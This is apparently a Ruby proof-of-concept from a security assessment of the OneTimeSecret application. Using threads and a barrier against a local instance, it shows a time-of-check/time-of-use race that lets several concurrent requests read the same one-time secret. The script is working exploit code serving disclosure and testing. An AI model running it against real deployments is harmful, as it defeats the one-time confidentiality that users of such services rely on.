# PoC: TOCTOU race in the one-time guarantee (model level, deterministic).
#
# Each thread runs the EXACT sequence a reveal request runs against its own
# freshly-loaded Secret instance:
#     s = Onetime::Secret.load(id)        # process_params
#     s.viewable?                         # raise_concerns gate (HEXISTS)
#     <barrier>                           # model the reachable concurrent interleave
#     v = s.decrypted_secret_value        # process: decrypt
#     s.revealed!                         # process: consume (destroy!)
#
# The barrier reproduces the state that arises in production whenever two
# requests both pass the viewable? gate before either calls destroy! — which
# happens readily across multiple Puma worker PROCESSES (no shared GIL).
# It does NOT alter any application code; it only schedules the threads.
#
# A correct one-time store hands the plaintext to AT MOST ONE caller.

Encoding.default_external = Encoding::UTF_8
Encoding.default_internal = Encoding::UTF_8
ENV['RACK_ENV']                 ||= 'development'
ENV['ONETIME_HOME']               = '/home/user/onetimesecret'
ENV['SECRET']                   ||= File.read('/home/user/security-assessment/notes/.test_secret').strip
ENV['REDIS_URL']                ||= 'redis://127.0.0.1:6379/0'
ENV['IDENTIFIER_SECRET']        ||= 'a' * 64
ENV['VERIFIABLE_ID_HMAC_SECRET']||= ENV['IDENTIFIER_SECRET']
ENV['HOST']                     ||= 'localhost:3000'
$LOAD_PATH.unshift('/home/user/onetimesecret/lib')
require 'onetime'
OT.execution_mode = :backend
Onetime.boot! :app
begin; require 'semantic_logger'; SemanticLogger.default_level = :fatal; rescue StandardError; end

CONC = (ARGV[0] || 10).to_i

def make_secret(plaintext)
  s = Onetime::Secret.new
  s.objid                      # ensure identifier exists before encryption (context binding)
  s.state    = 'new'
  s.owner_id = 'anon'
  s.lifespan = 3600
  s.ciphertext = plaintext     # encrypted_field setter encrypts under this record's context
  s.save
  s.identifier
end

id = make_secret("RACE-CANARY-#{Time.now.to_i}-#{rand(1_000_000)}")
puts "[setup] created secret id=#{id[0,16]}…  exists=#{Onetime::Secret.load(id) ? true : false}"

start = Queue.new
got   = Queue.new
destroys = Queue.new
natural = ENV['NOBARRIER']
threads = CONC.times.map do
  Thread.new do
    if natural
      start.pop                            # natural: release, then load+check+consume
      s = Onetime::Secret.load(id)
      viewable = s && s.viewable?
    else
      s = Onetime::Secret.load(id)         # fresh load — exactly like process_params
      viewable = s && s.viewable?          # raise_concerns gate (live HEXISTS)
      start.pop                            # barrier: all threads loaded+checked, now race the consume
    end
    next unless viewable
    val = s.decrypted_secret_value         # decrypt from in-memory ciphertext
    s.revealed!                            # consume: state-check (in-memory) + destroy!
    got << val if val && !val.empty?
    destroys << 1
  end
end
sleep 0.1
CONC.times { start << :go }                # release simultaneously
threads.each(&:join)

n = got.size
puts "[result] threads=#{CONC}  passed_viewable_gate+revealed_plaintext=#{n}  destroy!_calls=#{destroys.size}"
puts "[result] secret still present after run? #{Onetime::Secret.load(id) ? 'yes' : 'no (consumed)'}"
puts(n > 1 ?
  "[VULNERABLE] One-time guarantee BROKEN: the same secret's plaintext was returned to #{n} concurrent callers." :
  "[ok] plaintext returned to at most one caller.")
